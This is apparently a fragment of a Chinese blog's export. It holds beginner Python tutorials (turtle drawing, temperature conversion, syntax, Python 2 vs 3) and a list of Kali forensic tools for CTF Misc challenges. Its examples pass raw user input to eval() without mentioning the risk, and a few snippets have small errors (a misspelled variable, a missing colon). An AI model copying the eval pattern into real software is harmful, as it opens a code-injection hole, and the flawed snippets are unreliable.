title="turtle.fd()函数"></a>turtle.fd()函数</h4><p>用来控制画笔向当前行进方向前进一个距离。</p><pre><code>定义：turtle.fd(distance)别名：turtle.forward(distance)作用：向小海龟当前行进方向前进distance距离参数如下：#distance：行进距离的像素值，当值为负数时，表示向相反方向前进</code></pre><h4 id="turtle-seth-函数"><a href="#turtle-seth-函数" class="headerlink" title="turtle.seth()函数"></a>turtle.seth()函数</h4><p>用来改变画笔绘制方向。</p><pre><code>定义：turtle.seth(to_angle)别名：turtle.setheading(to_angle)作用：设置小海龟当前行进方向为to_angle,该角度是绝对方向角度值参数如下：#to_angle：角度的整数值</code></pre><p><img src="https://i.loli.net/2020/11/27/VduCgIDaJ9A81ly.png" alt="image-20201127124608385"></p><p>注意：turtle库的角度坐标体系以正东向为绝对0度，这也是小海龟初始爬行方向。正西向为绝对180度。上图的方向坐标体系是方向的绝对方向体系，与小海龟爬向当前方向无关。</p><h4 id="turtle-goto-函数"><a href="#turtle-goto-函数" class="headerlink" title="turtle.goto()函数"></a>turtle.goto()函数</h4><p>可以使用turtle.goto(x,y)方法来让小海龟沿着绝对坐标进行运动，且不打印其爬行轨迹。</p><p>以屏幕中间为原点(0,0)，形成四象限的坐标体系。</p><p><img src="https://i.loli.net/2020/11/27/NdikQ41ZT9EzMFc.png" alt="image-20201127164623691"></p><pre><code class="Python">turtle.goto(0,300)  #x为0,y为300,代表中心向上移动300turtle.goto(-100,-100)  #x为-100，代表向左移动100；y为-100，代表向下移动100</code></pre><h4 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h4><p>由保留字for引导的循环称为”遍历循环“，for语句的循环格式如下：</p><pre><code class="python">for i in range(&lt;循环次数&gt;)    &lt;语句块1&gt;</code></pre><p>例如实例2中的for循环表示循环内部的两个语句块连续执行4次：</p><pre><code class="python">for i in range(4):    turtle.circle(40, 80)    turtle.circle(-40, 80)</code></pre><h4 id="turtle-circle-函数"><a href="#turtle-circle-函数" class="headerlink" title="turtle.circle()函数"></a>turtle.circle()函数</h4><p>用来绘制一个弧形。</p><pre><code>定义：turtle.circle(radius, extent=None)作用：根据半径radius绘制extent角度的弧形参数如下：#radius：弧形半径，当值为正数时，半径在小海龟左侧(逆时针)；当值为负数时，半径在小海龟右侧(顺时针)#extent：绘制弧形的角度，当不设置参数或参数设置为None时，绘制整个圆形</code></pre><p><img src="https://i.loli.net/2020/11/27/uprBWaQxZbXdn8i.png" alt="image-20201127132201550"></p><p><img src="https://i.loli.net/2020/11/27/InHJazGQuSZW1Ms.png" alt="image-20201127133023244"></p><h3 id="函数的封装"><a href="#函数的封装" class="headerlink" title="函数的封装"></a>函数的封装</h3><p>实例2中的程序代码功能可以分为两类。一类是绘制图形前对画笔的设置，包括颜色、尺寸、初始位置等；另一类则是绘制Python蟒蛇的功能。因此，可以通过保留字def定义一个drawSnake()函数，将蟒蛇的绘制这个独立功能封装起来。代码如下：</p><pre><code class="python">import turtledef drawSnake(radius, angle, length):    turtle.seth(-40)    for i in range(length):        turtle.circle(radius, angle)        turtle.circle(-radius, angle)    turtle.circle(radius, angle/2)    turtle.fd(40)    turtle.circle(16, 180)    turtle.fd(40 * 2/3)turtle.setup(650, 350, 200, 200)turtle.penup()turtle.fd(-250)turtle.pendown()turtle.pensize(25)turtle.pencolor(&quot;purple&quot;)drawSnake(40, 80, 4)turtle.done()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Python语言(二)</title>
      <link href="2020/11/26/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)/"/>
      <url>2020/11/26/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h2 id="实例1：温度转换"><a href="#实例1：温度转换" class="headerlink" title="实例1：温度转换"></a>实例1：温度转换</h2><pre><code class="python">&#39;&#39;&#39;转换算法：C = (F-32)/1.8F = C*1.8 + 32&#39;&#39;&#39;TempStr = input(&quot;请输入带有符号的温度值：&quot;)if TempStr[-1] in [&#39;F&#39;,&#39;f&#39;]:    C = (eval(TempStr[0:-1]) - 32)/1.8    print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))elif TempStr[-1] in [&#39;C&#39;,&#39;c&#39;]:    F = 1.8*eval(TempStr[0:-1]) + 32    print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))else:    print(&quot;输入格式错误&quot;)</code></pre><p>运行结果：</p><p><img src="https://i.loli.net/2020/11/26/Vgm1Xz6Nl8yWD79.png" alt="image-20201126115434716"></p><h2 id="Python程序语法元素分析"><a href="#Python程序语法元素分析" class="headerlink" title="Python程序语法元素分析"></a>Python程序语法元素分析</h2><h3 id="程序的格式框架"><a href="#程序的格式框架" class="headerlink" title="程序的格式框架"></a>程序的格式框架</h3><p>（1）Python语言用严格的“缩进”来表明程序的格式框架。每行代码前的空白区域即是缩进，用来表示代码之间的包含和层次关系。</p><p>（2）缩进常用Tab键实现，也可用多个空格实现，通常是4个空格。缩进还包括单层缩进和经过嵌套形成的多层缩进。</p><p>（3）一般来说，判断、循环、函数、类等语法形式能够通过缩进包含一批代码。</p><p>（4）Python语法允许在表达式内部标记之间增加空格，这样有助于提高代码的可读性，但不能改变与缩进相关的空格数量，也不能在变量名中间增加空格。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>Python语言有两种方法：单行注释和多行注释。单行注释以#开头，多行注释则以’’’(3个单引号)开头和结尾。例如:</p><pre><code class="python">&#39;&#39;&#39;转换算法：C = (F-32)/1.8F = C*1.8 + 32&#39;&#39;&#39;</code></pre><h3 id="命名与保留字"><a href="#命名与保留字" class="headerlink" title="命名与保留字"></a>命名与保留字</h3><p>（1）Python语言采用大小写字母、数字、下划线和汉字等字符及其组合给变量命名，但首字符不能为数字，且中间不能出现空格，长度没有限制。注意：标识符对大小写敏感。</p><p>（2）保留字（Keyword），也称为关键字，不能用来给变量命名。Python3.x版本共有33个保留字，保留字同样对大小写敏感，例如for是保留字，而For则不是。</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>（1）Python语言中，字符串是用两个双引号””或者单引号’’括起来的零个或多个字符。</p><p>（2）字符串是字符的序列，可以按照单个字符或字符片段进行索引。字符串包括两种序号体系：正向递增序号和反向递减序号。二者可以混合使用，若字符串长度为L，则从左到右，正向递增序号为0~L-1;反向递减序号为-L~-1</p><p><img src="https://i.loli.net/2020/11/26/xe7X9WBL5aGA4jI.png" alt="image-20201126163416661"></p><p>（3）Python字符串也提供区间访问方式，采用[N:M]格式，表示字符串从N到M(不包含M)的子字符串，其中N和M都是字符串的索引序号。</p><pre><code class="python">TempStr = &quot;110C&quot;print(TempStr[-1])          #只打印最后一个字符，即&#39;C&#39;print(TempStr[0:2])         #打印第一第二个字符，即&#39;11&#39;print(TempStr[0:-1])        #打印除去最后一个字符的字符串,即&#39;110&#39;;效果和TempStr[0:3]一样print(TempStr[:])           #打印全部字符</code></pre><h3 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h3><p>（1）”=”表示赋值，包含等号的语句称为赋值语句，即将等号右侧的计算结果赋给左侧变量。例如：</p><pre><code class="python">TempStr = input(&quot;请输入带有符号的温度值：&quot;)   #将input()函数的结果赋给左侧变量TempStr</code></pre><p>（2）同步赋值语句，可以同时给多个变量赋值。若多个单一赋值语句在功能上表达了相同或相关的含义，或者在程序中属于相同的功能，都可以采用同步赋值语句。基本格式如下：</p><pre><code>&lt;变量1&gt;,…… &lt;变量n&gt; = &lt;表达式1&gt;,…… &lt;表达式n&gt;</code></pre><pre><code class="python">&gt;&gt;&gt;x, y = 10, 20&gt;&gt;&gt;print(x,y)10 20&gt;&gt;&gt;x, y = y, x       //交换x，y的数值不必再借助第三个变量&gt;&gt;&gt;print(x,y)20 10</code></pre><h3 id="input-函数"><a href="#input-函数" class="headerlink" title="input()函数"></a>input()函数</h3><p>在实例1中，input()函数从控制台获得用户输入，无论用户在控制台输入什么内容，input()函数都以字符串类型返回结果。在获得用户输入之前，input()函数可以包含一些提示性文字。</p><pre><code>&gt;&gt;&gt;input(&quot;请输入：&quot;)请输入：Python&#39;Python&#39;&gt;&gt;&gt;input(&quot;请输入：&quot;)请输入：12345&#39;12345&#39;</code></pre><p><img src="https://i.loli.net/2020/11/26/JbFk8tzdfEQmjg6.png" alt="image-20201126175216693"></p><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><p>分支语句的作用是根据判断条件选择程序执行路径，使用方法如下：</p><pre><code class="python">if &lt;条件1&gt;:    &lt;语句块1&gt;elif &lt;条件2&gt;:    &lt;语句块2&gt;...else:    &lt;语句块n&gt;</code></pre><p>其中，if、elif、else都是保留字，else后不再增加条件，表示不满足其他if语句的所有其余情况。例如实例1中的分支语句：</p><pre><code class="python">if TempStr[-1] in [&#39;F&#39;,&#39;f&#39;]:elif TempStr[-1] in [&#39;C&#39;,&#39;c&#39;]:else:</code></pre><p>第一个表达式由保留字”in”组成，表示判断字符串TempStr的最后一个字符(TempStr[-1])是否在一个由’F’或’f’组成的集合中，即TempStr[-1]是否等于’F’或’f’。如果相等，返回True，执行该条件下的语句块；否则返回False，判断下一个条件。其中用方括号和逗号组成的类型叫列表，格式为：[元素1,元素2,…,元素n]。</p><h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h3><p>eval(&lt;字符串&gt;)函数能够以Python表达式的方式解析并执行字符串，并将返回结果输出。例如：</p><pre><code class="python">&gt;&gt;&gt;x = 1&gt;&gt;&gt;eval(&quot;x + 1&quot;)2&gt;&gt;&gt;eval(&quot;1.1 + 2.2&quot;)3.3</code></pre><p>实例1中eval()函数将用户的部分输入(TempStr[0:-1])由字符串转化为数字，假设用户的输入为“102C”，经过eval()函数处理，转变为Python内部可以进行数学运算的的数值102</p><pre><code class="python">&gt;&gt;&gt;TempStr = &quot;102C&quot;&gt;&gt;&gt;eval(TempStr[0:-1])102</code></pre><p>使用eval()函数注意事项：</p><p>（1）若直接输入字符串”hello”，eval()函数会去掉两个引号，将其解释为一个变量。由于之前没有定义过hello变量，解释器会报错。</p><p>（2）当输入字符串”‘hello’”时，eval()函数去掉外部双引号后，内部还有一个单引号，则’hello’被解释为字符串。</p><p>（3）若要输入一个数字（小数或负数），并用程序对这个数字进行计算，可以采用eval(input(输入提示字符串))的组合，例如：</p><pre><code class="python">&gt;&gt;&gt;vlaue = eval(input(&quot;请输入要计算的数值：&quot;))请输入要计算的数值：1024&gt;&gt;&gt;print(value*2)2048</code></pre><p>（4）实例1中的代码：</p><pre><code class="python">C = (eval(TempStr[0:-1]) - 32)/1.8</code></pre><p>表示将TempStr字符串中除最后一位外的子串转换成数字，再对其进行运算。</p><h3 id="print-函数"><a href="#print-函数" class="headerlink" title="print()函数"></a>print()函数</h3><p>（1）print()是输出函数，当输出纯字符信息时，加上双引号或单引号即可直接把待输出的内容传递给print()函数。例如：</p><pre><code class="python">&gt;&gt;&gt;print(&quot;我爱我家&quot;)我爱我家</code></pre><p>（2）当输出变量值时，需要采用格式化输出方式，通过format()方法将待输出的变量整理成期望输出的格式。例如实例1中：</p><pre><code class="python">print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))</code></pre><p>print()函数用槽格式和format()方法将变量和字符串结合到一起输出。上述代码中，大括号{}表示一个槽位置，这个大括号的内容由后面的format()方法中的参数C或F填充。其中，大括号{:.2f}中的内容表示变量C(或F)的输出格式，具体为输出数值保留两位小数。</p><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>（1）循环语句的作用是根据判断条件确定一段程序是否再次执行一次或多次。实例1中不包含循环语句，程序执行一次后退出，若要让程序一直运行，连续接收用户的输入，可以采用循环语句进行改造。</p><pre><code class="python">TempStr = input(&quot;请输入带有符号的温度值：&quot;)while TempStr[-1] not in [&#39;N&#39;,&#39;n&#39;]:                #改造1，直到用户输入的最后一个字符是N或n时退出    if TempStr[-1] in [&#39;F&#39;,&#39;f&#39;]:        C = (eval(TempStr[0:-1]) - 32)/1.8        print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))    elif TempStr[-1] in [&#39;C&#39;,&#39;c&#39;]:        F = 1.8*eval(TempStr[0:-1]) + 32        print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))    else:        print(&quot;输入格式错误&quot;)    TempStr = input(&quot;请输入带有符号的温度值：&quot;)        #改造2</code></pre><p>（2）循环语句有多种类型，改造后的代码使用了条件循环，其基本过程如下：</p><pre><code class="python">while&lt;条件&gt;:    &lt;语句块1&gt;&lt;语句块2&gt;</code></pre><p>缩进表达了与while语句的所属关系。当条件为真时，进入循环，执行语句块1；当条件为假时，退出循环，执行语句块2。改造后的代码中的循环条件：</p><pre><code class="python">while TempStr[-1] not in [&#39;N&#39;,&#39;n&#39;]:</code></pre><p>语句中的not是保留字，表示对判断结果取反。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>（1）函数是对一组表达特定功能表达式的封装，能够接收变量并输出结果。input()、print()、eval()都是Python解释器的内置函数。编写代码时，函数的使用有助于阅读和复用，也使得程序模块化更好。</p><p>实例1中，程序按照顺序方式，从头到尾执行，对其进行如下改造：</p><pre><code class="python">def tempConvert(ValueStr):    if ValueStr[-1] in [&#39;F&#39;,&#39;f&#39;]:        C = (eval(ValueStr[0:-1]) - 32)/1.8        print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))    elif ValueStr[-1] in [&#39;C&#39;,&#39;c&#39;]:        F = 1.8*eval(ValueStr[0:-1]) + 32        print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))    else:        print(&quot;输入格式错误&quot;) TempStr = input(&quot;请输入带有符号的温度值：&quot;)tempConvert(TempStr)</code></pre><p>（2）上述代码中，用def保留字定义了一个名为tmpConvert()的函数，它使用一个参数ValueStr，函数所属代码是def所在行和其后面与之有缩进关系的代码。</p><p>（3）由def保留字定义的函数在程序中不被直接执行，需要使用函数名称调用才能执行。所以程序是从第10行开始执行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Python语言(一)</title>
      <link href="2020/11/24/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%B8%80)/"/>
      <url>2020/11/24/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h2 id="编译和解释"><a href="#编译和解释" class="headerlink" title="编译和解释"></a>编译和解释</h2><p>（1)高级语言按照计算机执行方式的不同可分成两类：静态语言和脚本语言。这里的执行方式是指计算机执行一个程序的过程，静态语言采用编译执行，脚本语言采用解释执行。</p><p>（2）编译：将源代码(高级语言代码)转换为目标代码(机器语言代码)的过程，执行编译的计算机程序称为编译器。编译是一次性的翻译，一旦程序被编译，则目标代码不再需要编译器就可以运行。</p><p>（3）解释：将源代码逐条转换成目标代码的同时逐条运行目标代码的过程，执行解释的计算机程序称为解释器。</p><p>解释在每次程序运行时都需要解释器和源代码。</p><table><thead><tr><th align="center">语言类型</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">静态语言(编译执行)</td><td align="center">C语言、Java语言</td></tr><tr><td align="center">脚本语言(解释执行)</td><td align="center">JavaScript语言、PHP语言、Python语言</td></tr></tbody></table><p>（4）Python语言虽然采用解释执行方式，但它的解释器也保留了编译器的部分功能，随着程序运行，解释器也会产生一个完整的目标代码。这种将解释器和编译器结合的新解释器是现代脚本语言为了提升计算机性能的一种有益演进。</p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>可在Python解释器自带的idle下编写Python语句，路径：D:\Python\Lib\idlelib，在该目录下双击idle.bat即可开始编写，也可直接在Windows下的“开始”菜单中搜索关键字”idle”找到快捷方式打开。</p><pre><code class="python">&gt;&gt;&gt;print(&quot;Hello World&quot;)Hello World</code></pre><p>其中，第一行的”&gt;&gt;&gt;”是Python语言运行环境的提示符，表示可以在这后面输入Python语句。第二行则是Python语句的执行结果。</p><h2 id="Python语言的特点"><a href="#Python语言的特点" class="headerlink" title="Python语言的特点"></a>Python语言的特点</h2><p>语法简洁、跨平台、可扩展、开源通用、支持中文、模式多样(支持面向过程和面向对象两种编程方式)、类库丰富的脚本语言。</p><h2 id="运行方式"><a href="#运行方式" class="headerlink" title="运行方式"></a>运行方式</h2><p>运行Python程序有两种方式：交互式和文件式。</p><p>交互式指Python解释器即时响应用户输入的每条代码，给出输出结果，一般用于调试少量代码。</p><p>文件式，也称为批量式，指用户将Python程序写在一个或多个文件中，然后启动Python解释器批量执行文件中的代码，是最常用的编程方式。</p><h3 id="交互式启动和运行方法"><a href="#交互式启动和运行方法" class="headerlink" title="交互式启动和运行方法"></a>交互式启动和运行方法</h3><p>交互式有两种启动和运行方法。</p><p>第一种方法，启动Windows命令行工具，Windows键+R快速打开运行窗口，输入”cmd”，在控制台输入”python”，在命令提示符”&gt;&gt;&gt;”后输入程序代码，回车后显示输出结果。在”&gt;&gt;&gt;”提示符后输入exit()或quit()可以退出Python运行环境。</p><p><img src="https://i.loli.net/2020/11/24/4jOUhvayTeZof5m.png" alt="image-20201124195448770"></p><p>第二种方法，通过调用IDLE来启动Python运行环境。</p><p><img src="https://i.loli.net/2020/11/24/4iaNIMPFjfoO5ry.png" alt="image-20201124195840923"></p><h3 id="文件式启动和运行方法"><a href="#文件式启动和运行方法" class="headerlink" title="文件式启动和运行方法"></a>文件式启动和运行方法</h3><p>文件式也有两种运行方式。</p><p>第一种方法，按照Python的语法格式在任意的编辑器中编写代码，可以使用Python安装包中的IDLE编辑器或者notepad++，然后保存为xx.py形式的文件。之后，进入xx.py文件所在目录，打开Windows的命令行窗口，输入</p><pre><code>python xxx.py</code></pre><p>即可运行Python程序文件获得输出。</p><p><img src="https://i.loli.net/2020/11/24/sXkwqECbHKyfrZW.png" alt="image-20201124201902643"></p><p>第二种方法，打开IDLE，按快捷键Ctrl+N打开一个新窗口，或者在菜单中选择File–&gt;New File选项。这个新窗口不再是交互模式，而是一个具备Python语法高亮辅助的编辑器，可进行代码编辑。编写完代码并保存为xx.py文件后，按快捷键F5，或者在菜单中选择Run–&gt;Run Module选项运行该文件。</p><p><img src="https://i.loli.net/2020/11/24/1O45caGsVpeJyhH.png" alt="image-20201124202318979"></p><h3 id="启动和运行方法推荐"><a href="#启动和运行方法推荐" class="headerlink" title="启动和运行方法推荐"></a>启动和运行方法推荐</h3><p>IDLE是一个简单有效的集成开发环境，支持交互式和文件式。其中，最常用且最重要的是采用IDLE的文件式方法。IDLE是小规模Python软件项目的主要编写工具，比IDLE更强大的Python语言集成开发环境是PyCharm，它主要用于中规模及以上的软件开发项目。</p><h2 id="运行Python小程序"><a href="#运行Python小程序" class="headerlink" title="运行Python小程序"></a>运行Python小程序</h2><p>（1）同切圆的绘制</p><p>文件式：</p><pre><code>import turtle            #引入turtle库turtle.pensize (2)       #设置画笔宽度为2像素turtle.circle (10)       #绘制半径为10像素的圆turtle.circle (40)       #绘制半径为40像素的圆turtle.circle (80)       #绘制半径为80像素的圆turtle.circle (160)      #绘制半径为160像素的圆</code></pre><p>运行结果：</p><p><img src="https://i.loli.net/2020/11/24/eHTuq74hitLckSF.png" alt="image-20201124234947504"></p><p>（2）日期和时间的输出</p><p>交互式：</p><pre><code>&gt;&gt;&gt;from datetime import datetime   #引用datetime库&gt;&gt;&gt;now = datetime.now()            #获取当前日期和时间信息&gt;&gt;&gt;print(now)&gt;&gt;&gt;now.strftime(&quot;%x&quot;)              #输出其中的日期部分&gt;&gt;&gt;now.strftime(&quot;%X&quot;)              #输出其中的时间部分</code></pre><p><img src="https://i.loli.net/2020/11/24/N2hJvTAxtF5y1Gw.png" alt="image-20201124235205031"></p><p>文件式：</p><pre><code>from datetime import datetime   #引用datetime库now = datetime.now()            #获取当前日期和时间信息print(now)print(now.strftime(&quot;%x&quot;))       #输出其中的日期部分print(now.strftime(&quot;%X&quot;))       #输出其中的时间部分，其中X大写</code></pre><p><img src="https://i.loli.net/2020/11/24/vhlAxUZELmpGYR6.png" alt="image-20201124233441815"></p><p>（3）import保留字用来引入函数库，绘制图形可以使用turtle库，获得系统的日期和时间使用datetime库</p><h2 id="程序的基本编写方法"><a href="#程序的基本编写方法" class="headerlink" title="程序的基本编写方法"></a>程序的基本编写方法</h2><h3 id="IPO程序编写方法"><a href="#IPO程序编写方法" class="headerlink" title="IPO程序编写方法"></a>IPO程序编写方法</h3><p>无论程序规模如何，每个程序都有统一的运算模式：输入数据、处理数据和输出数据。这种运算模式形成了基本的程序编写方法：IPO(Input，Process，Output)方法。</p><h3 id="输入-Input"><a href="#输入-Input" class="headerlink" title="输入(Input)"></a>输入(Input)</h3><p>输入是一个程序的开始。程序要处理的数据有多种来源，因此形成了多种输入方式。</p><table><thead><tr><th align="left">输入方式</th><th align="left">输入来源</th></tr></thead><tbody><tr><td align="left">文件输入</td><td align="left">文件</td></tr><tr><td align="left">网络输入</td><td align="left">互联网上的数据</td></tr><tr><td align="left">控制台输入</td><td align="left">程序使用者输入的信息</td></tr><tr><td align="left">交互界面输入</td><td align="left">通过提供一个图形交互界面从用户处获取</td></tr><tr><td align="left">随机数据输入</td><td align="left">将随机数作为程序输入，需要使用特定的随机数生成器程序或调用相关函数</td></tr><tr><td align="left">内部参数输入</td><td align="left">以程序内部定义的初始化变量作为输入</td></tr></tbody></table><h3 id="输出-Output"><a href="#输出-Output" class="headerlink" title="输出(Output)"></a>输出(Output)</h3><p>输出是程序展示运算成果的方式。</p><table><thead><tr><th>输出方式</th><th>具体实现</th></tr></thead><tbody><tr><td>控制台输出</td><td>通过程序运行环境中的命令打印输出结果，例如Windows中的命令行工具、IDLE工具</td></tr><tr><td>图形输出</td><td>在计算机中启动独立的图形输出窗口，根据指令绘制运算结果</td></tr><tr><td>文件输出</td><td>以生成新的文件或修改已有文件方式输出运行结果，是程序常用的输出方式</td></tr><tr><td>网络输出</td><td>以访问网络接口方式输出数据</td></tr><tr><td>操作系统内部变量输出</td><td>程序将运行结果输出到系统内部变量中，这类变量包括管道、线程、信号量等</td></tr></tbody></table><h3 id="处理-Process"><a href="#处理-Process" class="headerlink" title="处理(Process)"></a>处理(Process)</h3><p>处理是程序对输入数据进行计算产生输出结果的过程，计算问题的处理方法统称为“算法”。</p><h3 id="无限循环程序"><a href="#无限循环程序" class="headerlink" title="无限循环程序"></a>无限循环程序</h3><p>无限循环程序没有输入输出，例如：</p><pre><code class="python">while(True)   a = 1</code></pre><p>由于没有输入输出，代码会一直执行下去。该程序快速消耗CPU的计算资源，可以用来辅助测试CPU或系统性能。不过，没有输入输出的程序功能十分有限，仅在特殊情况下使用。</p><h2 id="Python语言的版本更迭"><a href="#Python语言的版本更迭" class="headerlink" title="Python语言的版本更迭"></a>Python语言的版本更迭</h2><p>Python2.x已是遗产，Python3.x是这个语言的现在和未来。Python2.x系列的最后一个版本，其主版本号为2.7。</p><p>版本之间的区别：更多区别可以查看Guido的文章：<a href="https://docs.python.org/3/whatsnew/3.0.html">https://docs.python.org/3/whatsnew/3.0.html</a></p><p>（1）修改编码：3.x系列默认采用UTF-8编码，表达UTF-8编码字符串时，无需在前面加上u或者U</p><p>（2）修改print语句：用print()函数替换了print语句，功能一样，格式不同</p><pre><code class="python">2.x:&gt;&gt;&gt;print &quot;The answer is&quot;, 2*23.x:&gt;&gt;&gt;print(&quot;The answer is&quot;, 2*2)2.x:&gt;&gt;&gt;print x3.x:&gt;&gt;&gt;print(x,end=&quot;,&quot;)</code></pre><p>（3）修改exec语句：用exec()函数替换了exec语句，功能一样，格式不同</p><p>（4）去掉&lt;&gt;符号，用!=表示“不等于”</p><p>（5）修改比较行为：用&lt;、&lt;=、&gt;=、&gt;符号比较两个元素时，若元素之间不存在有意义的顺序关系，将抛出TypeError错误，不再返回False，例如：</p><pre><code class="python">2.x:&gt;&gt;&gt;1 &lt; &quot;1&quot;False3.x:&gt;&gt;&gt;1 &lt; &quot;1&quot;Traceback (most recent call last):  File &quot;&lt;pyshell#3&gt;&quot;, line 1, in &lt;module&gt;    1 &lt; &quot;1&quot;TypeError: &#39;&lt;&#39; not supported between instances of &#39;int&#39; and &#39;str&#39;</code></pre><p>（6）Python3.x系列不再区分整数和长整数类型，只有一个int类型，且无取值范围限制。因此，sys.maxint常量被去掉</p><p>（7）修改整数除法：两个整数的一般除法(/)返回一个浮点数，不再返回一个整数，若想返回整数，则用整数除法(//)</p><pre><code class="python">2.x:&gt;&gt;&gt;3/213.x:&gt;&gt;&gt;3/21.53.x:&gt;&gt;&gt;3//21</code></pre><p>（8）3.x系列八进制整数格式使用0o开头，而不再使用0开头</p><p>（9）增加as、with、True、False、None作为关键字</p><p>（10）去掉raw_input()函数，用input()函数代替，input()返回一个字符串</p><p>（11）修改range()函数，与Python2.x系列中的xrange()类似，不再显示返回一个列表。若要返回列表，则需要通过list()函数转换</p><pre><code class="python">2.x:&gt;&gt;&gt;range(10)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]3.x:&gt;&gt;&gt;range(10)range(0,10)3.x:&gt;&gt;&gt;list(range(10))[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</code></pre><p>（12）修改返回类型：除range()外，zip()、map()、filter()、字典类型的key()方法、value()方法、item()方法不再返回列表类型</p><p>（13）修改异常处理表达：使用as关键字标识异常信息，例如：</p><pre><code class="python">2.x:&gt;&gt;&gt;try:       ...   wrong_name       ...except NameError, err:       ...   print err       ...       name &#39;wrong_name&#39; is not defined3.x:&gt;&gt;&gt;try:       ...   wrong_name       ...except NameError as err:       ...   print(err)       ...name &#39;wrong_name&#39; is not defined</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解Misc题常用的kali工具</title>
      <link href="2020/11/23/kali/%E8%A7%A3Misc%E9%A2%98%E5%B8%B8%E7%94%A8%E7%9A%84kali%E5%B7%A5%E5%85%B7/"/>
      <url>2020/11/23/kali/%E8%A7%A3Misc%E9%A2%98%E5%B8%B8%E7%94%A8%E7%9A%84kali%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>binwalk是一款Python编写的工具，在kali中已经预安装了，可以在Python2和Python3的环境下运行，在Python3中运行速度更快。</p><pre><code>apt-get install binwalk         //安装binwalkbinwalk file                 //查看是否存在隐藏文件binwalk -e file              //文件提取</code></pre><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>foremost在kali中已经预安装，可用于文件的分离</p><pre><code>apt-get install foremost     //安装foremostforemost -t all file         //分离文件，-t 指定文件类型，all则表示全部，后跟要分离的文件</code></pre><h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><p>zsteg可用于检测png和bmp图片里的隐写数据，为了使安装更快，要换为国内源</p><pre><code>gem sources -l             //查看现有源gem sources --remove https://rubygems.org/    //删除现有源gem sources -a http://gems.ruby-china.com/    //添加新源apt-get install gem        //安装gem，若不换源则需要等待许多时间gem install zsteg          //安装zsteg#使用方法，查看lsb数据zsteg xxx.bmpzsteg xxx.pngzsteg -a file             //查看各个通道的lsb</code></pre><h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>convert可以分解gif动图，kali自带的工具，无需安装</p><pre><code>convert xxx.gif flag.png       //分解gif动图，得到每一帧的图片按顺序以flag-x.png命名，-x为序号</code></pre><h2 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h2><p>montage用于图片的拼接，kali自带，无需安装，通常结合convert使用</p><pre><code>montage flag*.png -tile x1 -geometry +0+0 flag.png//-tile是拼接时每行和每列的图片数，这里用x1，就是只一行//-geometry是首选每个图和边框尺寸，边框为0，图照为原始尺寸//拼接好的图片命名为flag.png</code></pre><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>查看可以打印的字符，通常可以借助管道符+grep匹配flag信息</p><pre><code>strings filestrings file | grep flag</code></pre><h2 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h2><p>保存当前的工作区与暂存区的状态，把当前的工作隐藏起来，等需要的时候再恢复</p><pre><code>git log           //查看git记录git stash list    //查看修改列表git stash show    //校验列表中的存储文件git stash apply   //恢复被隐藏的文件</code></pre><h2 id="gnuplot"><a href="#gnuplot" class="headerlink" title="gnuplot"></a>gnuplot</h2><p>gnuplot是一个命令行的交互式绘图工具。</p><pre><code>apt-get install gnuplot       //安装gnuplot工具</code></pre><p>使用：</p><p>在终端输入gnuplot，之后输入plot，后跟坐标文件，回车后即可看到绘制的图片。</p><p>例如BugkuCTF中的图穷匕见：</p><p><img src="https://i.loli.net/2020/11/24/LqcMiNKyJ5enmAl.png" alt="image-20201124170748506"></p><p><img src="https://i.loli.net/2020/11/24/5ySqZlarOGKsB1g.png" alt="image-20201124170808090"></p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali的基本使用</title>
      <link href="2020/11/20/kali/kali%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
